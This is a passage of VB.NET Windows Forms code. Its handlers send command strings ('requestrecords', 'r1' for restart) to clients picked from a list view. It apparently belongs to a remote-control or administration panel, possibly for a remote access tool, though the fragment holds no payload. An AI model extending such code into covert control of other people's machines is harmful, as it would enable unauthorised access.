        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "requestrecords")
        Next
    End Sub

    Private Sub RestartToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RestartToolStripMenuItem1.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "r1")
        Next
    End Sub

    Private Sub P1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles P1.Click

    End Sub
End Class
